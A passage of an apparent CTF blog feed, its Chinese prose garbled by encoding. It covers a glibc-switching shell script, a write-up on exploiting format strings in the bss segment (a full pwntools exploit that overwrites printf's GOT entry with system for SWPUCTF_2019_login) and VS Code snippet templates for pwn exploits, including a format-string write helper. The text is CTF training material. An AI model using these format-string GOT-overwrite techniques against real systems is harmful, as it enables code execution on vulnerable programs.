&quot;--help&quot; ]] || [[ $1 = &quot;-h&quot; ]] || [[ $1 = &quot;&quot; ]]</span><br><span class="line">then</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    echo &quot;arg1: libcç‰ˆæœ¬&quot;</span><br><span class="line">    echo &quot;arg2: 32 or 64&quot;</span><br><span class="line">    echo &quot;arg3: binary path&quot;</span><br><span class="line">    echo &quot;such as: sl 2.23 64 ./pwn&quot;</span><br><span class="line">    echo &quot;--------------------&quot;</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">message=&quot;è¯·æŸ¥çœ‹å¸®åŠ© -h (--help)&quot;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">&quot;2.23&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.23-0ubuntu11.3_i386/ld-2.23.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.27&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.27-3ubuntu1.2_i386/ld-2.27.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.27-3ubuntu1.2_i386/libc-2.27.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.29&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.29/64/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/64/lib/libc-2.29.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.29/32/lib/ld-2.29.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.29/32/lib/libc-2.29.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">&quot;2.31&quot;)</span><br><span class="line">    if [ $2=&quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        ld=&quot;/glibc/2.31/64/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/64/lib/libc-2.31.so&quot;</span><br><span class="line">    elif [ $2=&quot;32&quot; ]</span><br><span class="line">    then </span><br><span class="line">        ld=&quot;/glibc/2.31/32/lib/ld-2.31.so&quot;</span><br><span class="line">        libc=&quot;/glibc/2.31/32/lib/libc-2.31.so&quot;</span><br><span class="line">    else</span><br><span class="line">        echo $message</span><br><span class="line">    fi</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo $message</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line">echo -e &quot;\033[1;32mld-path:$ld\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[1;32mlibc-path:$libc\033[0m&quot;</span><br><span class="line">figlet -f small &quot;Switch the  libc&quot;</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter $ld $3</span><br><span class="line">LD_PRELOAD=$libc $3</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bssæ®µä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨æ‰‹æ³•</title>
      <link href="2021/07/19/format-bss/"/>
      <url>2021/07/19/format-bss/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h2><p>bssæ®µä¸Šçš„åˆ©ç”¨æ‰‹æ³•ä¸æ ˆä¸åŒï¼Œå› ä¸ºä¸èƒ½å‘æ ˆä¸­ç›´æ¥å†™å…¥æ•°æ®äº†</p><p>åˆ©ç”¨æ‰‹æ³•æ˜¯ä¸€ä¸ªé—´æ¥å†™å…¥çš„æ€æƒ³</p><p>ç”¨Câ€™ä»£æ›¿Cï¼ŒCâ€™å’ŒCç›¸ä¼¼</p><blockquote><p>A -&gt; B -&gt; C</p><p>A -&gt; B -&gt; Câ€™</p></blockquote><p>å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼š</p><ul><li>æ”¹retåœ°å€ä¸­çš„__libc_start_mainæ”¹ä¸ºone_gadget</li><li>æ”¹printfçš„gotä¸ºsystem</li></ul><h2 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h2><p>ä¸€ä¸ªå…¸å‹çš„bssæ®µä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ— é™è¾“å…¥</p><p>å› ä¸ºchecksecåå‘ç°gotè¡¨å¯å†™ï¼Œæ€è·¯å°±æ˜¯å°†printf@gotçš„å†…å®¹æ”¹ä¸ºsystemï¼Œç„¶åè¾“å…¥/bin/shå³å¯getshell</p><p>æ­¥éª¤åˆ†ä¸‰æ­¥ï¼š</p><ol><li>æ‰¾åˆ°ç¬¬ä¸€ä¸ªè·³æ¿ï¼Œå°†å…¶æ”¹ä¸ºprintf@got</li><li>æ‰¾åˆ°ç¬¬äºŒä¸ªè·³æ¿ï¼Œå°†å…¶æ”¹ä¸ºprintf@got + 2</li><li>ä¸€æ¬¡æ€§å°†printf@gotçš„åå››ä½æ”¹ä¸ºsystemçš„åå››ä½ï¼Œå°†printf@got + 2çš„åä¸¤ä½æ”¹ä¸ºsystem&gt;&gt;16çš„åä¸¤ä½</li></ol><p>å‰ä¸¤æ­¥åˆåˆ†ä¸ºä¸¤ä¸ªå°æ­¥ï¼Œç°å°†ä¸­é—´è¿‡ç¨‹æˆªå›¾å¦‚ä¸‹ï¼š</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><blockquote><p>æ‰¾åˆ°ç¬¬ä¸€ä¸ªè·³æ¿</p></blockquote><p><img src="https://i.loli.net/2021/07/21/LOzf9NEIjK7spCo.png" alt=""></p><blockquote><p>å°†ç¬¬ä¸€ä¸ªè·³æ¿æ”¹ä¸ºprintf@got</p></blockquote><p><img src="https://i.loli.net/2021/07/21/snqPy763Dl8pdBH.png" alt=""></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>ï¼ˆåŒstep1ï¼‰</p><p>å®Œæˆå‰ä¸¤æ­¥åï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://i.loli.net/2021/07/21/keJgx3hBKsY9OcZ.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./SWPUCTF_2019_login&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../32-libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params"> payload</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># %15$p</span></span><br><span class="line">    <span class="comment"># %21$p</span></span><br><span class="line">    ru(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;lemon&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input your password:&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%15$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>) - <span class="number">241</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    fmt(<span class="string">&quot;%21$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base=<span class="number">16</span>)</span><br><span class="line">    target = stack - <span class="number">0x90</span></span><br><span class="line">    echo(<span class="string">&quot;target:&quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    offset = -<span class="number">0x30</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>]) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    offset = -<span class="number">0x38</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((target + offset) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    fmt(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x90</span></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((elf.got[<span class="string">&quot;printf&quot;</span>] + <span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack</span></span><br><span class="line">    offset1 = -<span class="number">0x30</span>     <span class="comment"># got</span></span><br><span class="line">    offset2 = -<span class="number">0x38</span>     <span class="comment"># got + 2</span></span><br><span class="line">    echo(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>])) </span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset2 // <span class="number">4</span>) + <span class="string">&quot;$hhn&quot;</span> </span><br><span class="line">    temp = (libc.sym[<span class="string">&quot;system&quot;</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((libc.sym[<span class="string">&quot;system&quot;</span>] &amp; <span class="number">0xffff</span>) - temp) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">21</span> + offset1 // <span class="number">4</span>) + <span class="string">&quot;$hn&quot;</span> </span><br><span class="line">    sd(payload)</span><br><span class="line">    ru(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29886</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./SWPUCTF_2019_login&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn expæ¨¡æ¿ + vscode snippet</title>
      <link href="2021/07/19/Snippet/"/>
      <url>2021/07/19/Snippet/</url>
      
        <content type="html"><![CDATA[<p>  snippetï¼Œæˆ–è€…è¯´ã€Œcode snippetã€ï¼Œä¹Ÿå³ä»£ç ç‰‡ï¼ŒæŒ‡çš„æ˜¯èƒ½å¤Ÿå¸®åŠ©è¾“å…¥é‡å¤ä»£ç æ¨¡å¼ï¼Œæ¯”å¦‚å¾ªç¯æˆ–æ¡ä»¶è¯­å¥ï¼Œçš„æ¨¡æ¿ã€‚é€šè¿‡ snippet ï¼Œæˆ‘ä»¬ä»…ä»…è¾“å…¥ä¸€å°æ®µå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥åœ¨ä»£ç ç‰‡å¼•æ“çš„å¸®åŠ©ä¸‹ï¼Œç”Ÿæˆé¢„å®šä¹‰çš„æ¨¡æ¿ä»£ç ï¼Œæ¥ç€æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åœ¨é¢„å®šä¹‰çš„å…‰æ ‡ä½ç½®ä¹‹é—´è·³è½¬ï¼Œæ¥å¿«é€Ÿè¡¥å…¨æ¨¡æ¿ã€‚</p><p>vscode é›†æˆäº†è¿™ç§åŠŸèƒ½ï¼Œctrl + shift + pï¼Œå°±å¯ä»¥è°ƒå‡ºâ€œé…ç½®ç”¨æˆ·ä»£ç ç‰‡æ®µâ€çš„åŠŸèƒ½</p><p>å› ä¸ºpwnæ¨¡æ¿å¾ˆå¤šéƒ½ç›¸ä¼¼ï¼Œæ¯”å¦‚éƒ½ä¼šåŠ è½½binaryæ–‡ä»¶ï¼Œåœ¨heapèœå•ä¸­éƒ½æœ‰addç­‰è¯¸å¦‚æ­¤ç±»çš„åŠŸèƒ½ï¼Œæ¯æ¬¡å†™éƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œæˆ‘ä¹‹å‰é…ç½®è¿‡snippetï¼Œä½†æ˜¯æƒ³è¦ä¸€ä¸ªåŠè‡ªåŠ¨åŒ–çš„æ–¹æ³•æ¥é…ç½®ï¼Œå†™äº†ä¸€ä¸ªå°è„šæœ¬æ¥å®Œæˆè¿™ä¸ªåŠŸèƒ½</p><ul><li>githubåœ°å€:<a href="https://github.com/LA13x/vscode-snippet-pwn-template">https://github.com/LA13x/vscode-snippet-pwn-template</a></li></ul><h2 id="pwn-expæ¡†æ¶"><a href="#pwn-expæ¡†æ¶" class="headerlink" title="pwn expæ¡†æ¶"></a>pwn expæ¡†æ¶</h2><p>æ­¤æ¡†æ¶é‡‡ç”¨äº†å¸ˆå‚…ä»¬çš„æ¨¡æ¿ï¼Œå…·ä½“é“¾æ¥æ”¾åˆ°Referenceä¸­<br>æˆ‘å†™äº†ä¸‰ä¸ªsnippetï¼Œåˆ†åˆ«æ˜¯æ€»ä½“ä¸Šçš„pwnæ¡†æ¶ï¼Œmenuæ¡†æ¶ï¼ˆheapä¸­çš„ï¼‰è¿˜æœ‰64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¡†æ¶ï¼Œåˆ†åˆ«å¦‚ä¸‹</p><h3 id="pwn-py"><a href="#pwn-py" class="headerlink" title="pwn.py"></a>pwn.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;$1&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;$2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="menu-py"><a href="#menu-py" class="headerlink" title="menu.py"></a>menu.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;$1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h3 id="format-py"><a href="#format-py" class="headerlink" title="format.py"></a>format.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå³ç¬¬å‡ ä¸ªå‚æ•°</span></span><br><span class="line"><span class="string">    ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ”¹å“ªé‡Œçš„å€¼</span></span><br><span class="line"><span class="string">    ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æŠŠæƒ³æŠŠç›®æ ‡å€¼æ”¹æˆä»€ä¹ˆå€¼</span></span><br><span class="line"><span class="string">    ç¬¬å››ä¸ªå‚æ•°æ˜¯çœ‹çœ‹åœ¨printfä¹‹å‰è¿˜æœ‰æ²¡æœ‰å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">    ç¬¬äº”ä¸ªå‚æ•°æ˜¯ljustå¡«è¡¥æ ¸å¿ƒpayloadä¹‹åï¼Œè®©å…¶0x8ä¸ªå­—èŠ‚å¯¹é½ï¼Œé»˜è®¤æ˜¯0x50</span></span><br><span class="line"><span class="string">    ç¬¬å…­ä¸ªå‚æ•°æ˜¯è¦è¦†ç›–çš„ä½æ•°ï¼Œé»˜è®¤ä¸º6</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span 